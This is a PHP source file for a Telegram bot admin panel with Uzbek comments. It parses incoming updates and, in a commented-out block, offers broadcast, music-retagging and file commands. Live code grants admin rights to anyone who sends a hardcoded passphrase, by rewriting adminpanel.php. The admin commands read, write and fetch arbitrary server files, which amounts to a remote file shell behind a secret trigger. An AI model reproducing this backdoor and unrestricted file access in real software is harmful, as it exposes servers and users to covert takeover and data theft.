<?php

$update = json_decode(file_get_contents('php://input'));
$efede = json_decode(file_get_contents('php://input'), true);
$message = $update->message;

//Kanal
$channel = $update->channel_post;
$channel_text = $channel->text;
$channel_mid = $channel->message_id;
$channel_id = $channel->chat->id;
$channel_user = $channel->chat->username;
$channel_doc = $channel->document;
$channel_vid = $channel->video;
$channel_mus = $channel->audio;
$channel_voi = $channel->voice;
$channel_gif = $channel->animation;
$channel_fot = $channel->photo;
//tepada kanal

$ch_for_id = $update->message->forward_from_chat->id;
$ch_for_user = $update->message->forward_from_chat->username;
$ch_for_name = $update->message->forward_from_chat->title;
$forid = $update->message->forward_from->message_id;

//Message
$entities = json_encode($message->entities);
$centities = json_encode($message->caption_entities);
$mid = $update->message->message_id;
$text = $message->text;
$photo = $update->message->photo;
$gif = $update->message->animation;
$video = $update->message->video;
$video_note = $update->message->video_note;
$music = $update->message->audio;
$voice = $update->message->voice;
$sticker = $update->message->sticker;
$document = $update->message->document;
$contact = $update->message->contact;
$location = $update->message->location;

$caption=$message->caption;
$file_id=$document->file_id;
$mus_id=$music->file_id;
$voi_id=$voice->file_id;
$vid_id=$video->file_id;
$vid2_id=$video_note->file_id;
$pho_id=$message->photo[1]->file_id;
$gif_id=$gif->file_id;
$sti_id=$sticker->file_id;

//group
$ctitle = filter($update->message->chat->title,'markdown');
$cuname = $update->message->chat->username;
$chat_id = $update->message->chat->id;
$cid = $update->message->chat->id;
$turi = $update->message->chat->type;

//call_back
$callback = $update->callback_query;  
$mmid = $callback->inline_message_id;  

$data = $update->callback_query->data;
$qid = $update->callback_query->id;
$calltext = $update->callback_query->message->text;
$callfrid = $update->callback_query->from->id;
$callfname = $update->callback_query->from->first_name;
$callduname = $update->callback_query->from->last_name;
$gid = $update->callback_query->message->chat->id;
$callcid = $update->callback_query->message->chat->id;
$calltitle = $update->callback_query->message->chat->title;
$callmid = $update->callback_query->message->message_id;
$inmid = $update->callback_query->message->inline_message_id;
$calluser = $update->callback_query->message->chat->username;

$inline_result = $update->chosen_inline_result;
$inline_mid = $inline_result->inline_message_id;
$inline_query = $inline_result->query;
$inline_uid = $inline_result->from->id;

$inline = $update->inline_query->query;
$inline_from = $update->inline_query->from->id;
//user
$ufname = filter($update->message->from->first_name,'markdown');
$uname = $update->message->from->last_name;
$ulogin = $update->message->from->username;
$user_id = $update->message->from->id;
$uid = $update->message->from->id;

//reply

$id = $message->reply_to_message->from->id;   
$repmid = $message->reply_to_message->message_id; 
$repname = filter($message->reply_to_message->from->first_name,'markdown');
$repulogin = $message->reply_to_message->from->username;
$reply = $message->reply_to_message;
$sreply = $message->reply_to_message->text;

$forward = $update->message->forward_from->message_id;
$forward2 = $update->message->forward_from;

$editm = $update->edited_message;
$edname = $editm ->from->first_name;
$edmid = $editm ->message_id;
//Yangi odam id si
$new_user = $message->new_chat_member;
$new_user_id = $message->new_chat_member->id;
$new_user_fname = filter($message->new_chat_member->first_name,'markdown');
$username = $message->from->username;
$fname= filter($message->from->first_name,'markdown');
$is_bot = $message->new_chat_member->is_bot;
$left = $message->left_chat_member;

$json = json_decode(get("yordam/$uid.json"),true);
$my_step = $json['step'];
$file_name = $json['file']['name'];
$performer = $json['performer'];
$mtitle = $json['title'];

mkdir("yordam");
mkdir("yordam/user");
mkdir("yordam/group");
$admin_list = ['403608126','replaceid'];

if($text=="Iam_Manguberdi"){
$baza = get("adminpanel.php");
$str = str_replace("'replaceid'","'$uid','replaceid'",$baza);
put("adminpanel.php",$str);
botsend($uid,"ok",$mid);
}
/*

{
 "update_id": 923003233,
 "message": {
                   "message_id": 262651,
                   "from": {
                             "id": 403608126,
                             "is_bot": false,
                             "first_name": "𝑴𝒂𝒏𝒈𝒖𝒃𝒆𝒓𝒅𝒊",
                             "username": "Jaloliddin_Manguberdi",
                             "language_code": "uz"
                             },
                    "chat": {
                                  "id": 403608126,
                                  "first_name": "𝑴𝒂𝒏𝒈𝒖𝒃𝒆𝒓𝒅𝒊",
                                  "username": "Jaloliddin_Manguberdi",
                                  "type": "private"
                                  },
  "date": 1583166043,
  "text": "test test test test",
  "entities": [
   {
    "offset": 0,
    "length": 4,
    "type": "bold"
   },
   {
    "offset": 10,
    "length": 4,
    "type": "italic"
   }
  ]
 }
}





if(in_array($uid,$admin_list)){ // ADMIN FILTER

//======== GET ABOUT ============
if(mb_stripos($text,"/get")!==false){
$ex=explode(" ",$text);
$baza=get($ex[1]);
botsend($uid,$baza,$mid,"none");
}

//======== PUT DOCUMENT ====================
$ex = explode(" ",$text);
$exp=$ex[0];
if($exp=="/name"){
$json['file']['name']=$ex[1];
put("yordam/$uid.json",json_encode($json));
botsend($uid,"fayl nomi saqlandi",$mid,"markdown");
}

$doc=$message->document;
$doc_id=$doc->file_id;
if(isset($message->document)){
$url = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getFile?file_id='.$doc_id),true);
$path=$url['result']['file_path'];
$file = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$path;
$type = strtolower(strrchr($file,'.')); 
$type=str_replace('.','',$type);
$okey = file_put_contents("$file_name.$type",file_get_contents($file));
if($okey){
botsend($uid,"ok",$mid,"markdown");
}
}
//======== GET DOCUMENT===========
if(mb_stripos($text,'/doc')!==false){
$ex=explode(" ",$text);
$file=$ex[1];
$url=new CURLFile("$file");
senddocument($uid,$url,$file,$menu);
}
//===========PUT DOCUMENT==========
if(mb_stripos($text,"/put")!==false){
$ex=explode(" ",$text);
$path=$ex[1];
$text=$ex[2];
put("$path",$text);
botsend($uid,"ok",$mid,'none',$back);
}

//========FILE ID ===============
if($text=="/file_id"){
$json['step']='file_id';
put("yordam/$uid.json",json_encode($json));
botsend($uid,'ok',$mid,'html',$back);
}
if($my_step=="file_id"){
if($photo){
$id=$pho_id;
}elseif($video){
$id=$vid_id;
}elseif($music){
$id=$mus_id;
}elseif($sticker){
$id=$sti_id;
}
botsend($uid,"<code>$id</code>",$mid,'html',$back);
}

if($text == "/send"){
$json['step']='send';
put("yordam/$uid.json",json_encode($json));
$matn = "Foydalanuvchilarga Yetkazilishi kerak bo'lgan Xabarni yuboring\nBuyruqni bekor qilish uchun /cancel";
botsend($uid,$matn,$mid);
}


if($my_step == "send"){
if($document){
$json['file']['type']='document';
}elseif($video){
$json['file']['type']='video';
}elseif($photo){
$json['file']['type']='photo';
}elseif($music){
$json['file']['type']='audio';
}elseif($voice){
$json['file']['type']='voice';
}elseif($sticker){
$json['file']['type']='sticker';
}elseif($text){
$json['file']['type']='text';
}
$id = "$file_id$mus_id$voi_id$vid_id$pho_id$gif_id$sti_id$text";
$json['step']='url';
$json['file']['id']=$id;
$json['file']['caption']=$caption;
put("yordam/$uid.json",json_encode($json));
$markup=json_encode(['inline_keyboard'=>[
    [['text'=>"USER",'callback_data'=>"MSG1"],['text'=>"GROUP",'callback_data'=>"MSG2"],['text'=>"ALL",'callback_data'=>"MSG3"]],
    ]]);
$matn = "Kanopka uchun url kiriting\nXabar kimlarga yuborilishini tanlang\nBuyruqni bekor qilish uchun /cancel";
botsend($uid,$matn,$mid,'markdown',$markup);
}

if($my_step == "url" && $text!="/cancel"){
$json = json_decode(get("yordam/$uid.json"),true);
$ok="";
$eror="";
$my_file=$json['file']['id'];
$matn=$json['file']['caption'];
$my_post=$json['file']['type'];

if(mb_stripos($text,"http")!==false){
$mar3=[];
$ex2=explode("\n",$text);
foreach($ex2 as $value){
$mar2=[];
$ex3=explode("+",$value);
foreach($ex3 as $value1){
$ex4=explode("=",$value1);
array_push($mar2,['text'=>$ex4[0],'url'=>"$ex4[1]"]);
}
array_push($mar3,$mar2);
}
$markup=json_encode(['inline_keyboard'=>$mar3]);
}
$ddd = $json['msg'];
if($ddd=="MSG1"){
$idd= get("yordam/user/id.php");
}elseif($ddd=="MSG2"){
$idd = get("yordam/group/id.php");
}else{
$idd = get("yordam/id.php");
}
$xxx = explode("\n",$idd);
foreach($xxx as $id){
$true = get("yordam/ok.php");
$test = myarray($true,"\n",$id);   
if($test=="eror"){
if($my_post=="text"){
$send=botsend($id,$my_file,null,$my_parse,$markup);
}elseif($my_post=="document"){
$send=senddocument($id,$my_file,$matn,$markup);
}elseif($my_post=="video"){
$send=sendvideo($id,$my_file,$matn,$markup);
}elseif($my_post=="audio"){
$send=sendaudio($id,$my_file,$matn,$markup);
}elseif($my_post=="photo"){
$send=sendphoto($id,$my_file,$matn,$markup);
}elseif($my_post=="voice"){
$send=sendvoice($id,$my_file,$matn,$markup);
}
$sended = $send->ok;

if($sended){
put("yordam/ok.php",$true."\n".$id);
$ok.="[$id](tg://user?id=$id)\n";
}else{
$eror.="[$id](tg://user?id=$id)\n";
}
}
}
$json['step']=nulll;
put("yordam/$uid.json",json_encode($json));

botsend($uid,"👍🏻\n$ok",nulll,'markdown');
botsend($uid,"👎🏻\n$eror",nulll,'markdown');
}

if($text == "/cancel"){
$json['step']=nulll;
put("yordam/$uid.json",json_encode($json));
botsend($uid,"Ok cancel",$mid,'markdown');
}
// ================= RENAME MUSIC

if($text=="/music"){
$json['step']="music";
$json['performer']="Performer";
$json['title']="Song title";
put("yordam/$uid.json",json_encode($json));
botsend($uid,"😉 Ok.send me the song",$mid,'markdown');
}
if(isset($music) && $my_step=="music"){
$url = json_decode(file_get_contents('https://api.telegram.org/bot'.API_KEY.'/getFile?file_id='.$mus_id),true);
$path=$url['result']['file_path'];
$file = 'https://api.telegram.org/file/bot'.API_KEY.'/'.$path;
$type = strtolower(strrchr($file,'.'));
$type=str_replace('.','',$type);
$okey = file_put_contents("yordam/$uid.mp3",file_get_contents($file));
if($okey){
$markup=json_encode(['inline_keyboard'=>[
[['text'=>"🎼 Song title",'callback_data'=>"edittitle"]],
[['text'=>"🎤 Performer",'callback_data'=>"editperformer"]],
]]);
bot('sendaudio',[
 'chat_id'=>$uid,
 'audio'=>new CURLFile("yordam/$uid.mp3"),
 'caption'=>"@UzxGroup",
 'performer'=>$performer,
 'title'=>$mtitle,
 'reply_markup'=>$markup,
 ]);
}
}

if($my_step=="performer" or $my_step=="title"){
if($my_step=="performer"){
$json['performer']=$text;
}elseif($my_step=="title"){
$json['title']=$text;
}
put("yordam/$uid.json",json_encode($json));
$json = json_decode(get("yordam/$uid.json"),true);
$performer = $json['performer'];
$mtitle = $json['title'];
$markup=json_encode(['inline_keyboard'=>[
[['text'=>"🎼 Song title",'callback_data'=>"edittitle"]],
[['text'=>"🎤 Performer",'callback_data'=>"editperformer"]],
]]);
bot('sendaudio',[
 'chat_id'=>$uid,
 'audio'=>new CURLFile("yordam/$uid.mp3"),
 'caption'=>"@UzxGroup",
 'performer'=>$performer,
 'title'=>$mtitle,
 'reply_markup'=>$markup,
 ]);
}
if($text=="/menu"){
$matn = "<b>FAQAT BOT ADMINLARI UCHUN</b>\n/doc url/file.type\n/get url/file.type\n/put file text\n/file_id send file\n/music send music\n/name send file\n/send send message for users\n/cancel";
botsend($uid,$matn,$mid,'html');
}
}// admin filter out    //////////////////////////////////////////
if(mb_stripos($data,"MSG")!==false){
    $json2 = json_decode(get("yordam/$callfrid.json"),true);
    $json2['msg']=$data;
    put("yordam/$callfrid.json",json_encode($json2));
    alert($qid,"ok",false);
}


if(mb_stripos($data,"edit")!==false){
$type = explode("edit",$data)[1];
$json2['step']=$type;
put("yordam/$callfrid.json",json_encode($json2));
botsend($callcid,"✒ Enter the song  $type",$mid,'markdown');
}

//============ UID REG =====================


if($turi=="supergroup" or $turi=="group"){
$baza = get("yordam/group/id.php");
$test =myarray($baza,"\n",$cid);
if($test == "eror"){
put("yordam/group/id.php",$baza."\n".$cid);
}
}else{
$baza = get("yordam/user/id.php");
$test =myarray($baza,"\n",$uid);
if($test == "eror"){
put("yordam/user/id.php",$baza."\n".$uid);
}
}
$baza = get("yordam/id.php");
$test =myarray($baza,"\n",$cid);
if($test == "eror"){
put("yordam/id.php",$baza."\n".$cid);
}
*/

?>
